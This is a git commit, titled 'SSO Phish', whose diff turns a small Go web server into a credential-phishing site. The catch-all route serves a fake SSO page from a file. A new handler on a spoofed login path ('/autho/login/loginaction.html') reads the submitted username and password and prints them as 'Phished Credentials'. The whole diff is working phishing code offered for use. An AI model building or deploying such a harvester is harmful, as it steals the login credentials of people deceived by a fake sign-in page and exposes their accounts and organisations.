675dfdcf4caee9bce1e168cf84bbd2bd4fdfe6be
f47h3r <f47h3r@fsociety.ninja>
2016-07-04 18:27:33 -0700

    SSO Phish

--- app.go
+++ app.go
@@ -1,8 +1,10 @@
 package main
 
 import (
+	"fmt"
 	"github.com/gorilla/mux"
 	"io"
+	"io/ioutil"
 	"log"
 	"net/http"
 )
@@ -11,20 +13,26 @@ func ServerStatus(w http.ResponseWriter, req *http.Request) {
 	io.WriteString(w, "UPUPUP\n")
 }
 
-/*
-func Index(resp http.ResponseWriter, req *http.Request) {
-	io.WriteString(resp, "INDEX\n")
-}
-*/
-
 func Redirect(resp http.ResponseWriter, req *http.Request) {
-	io.WriteString(resp, "Redirecting to SSO ;) \n")
+	//io.WriteString(resp, "Redirecting to SSO ;) \n")
+	body, _ := ioutil.ReadFile("sso.html")
+	io.WriteString(resp, string(body))
+}
+
+func CredCollector(w http.ResponseWriter, req *http.Request) {
+	req.ParseForm()
+	username := req.FormValue("userid")
+	password := req.FormValue("password")
+
+	fmt.Printf("\nPhished Credentials:\n\n\tUser:\t\t%s\n\tPassword:\t%s\n\n", username, password)
+
 }
 
 func main() {
 	rtr := mux.NewRouter()
 	rtr.HandleFunc("/status", ServerStatus)
-	//rtr.HandleFunc("/index", Index)
+	rtr.HandleFunc("/autho/login/loginaction.html", CredCollector)
+
 	rtr.HandleFunc("/{rest:.*}", Redirect)
 
 	http.Handle("/", rtr)
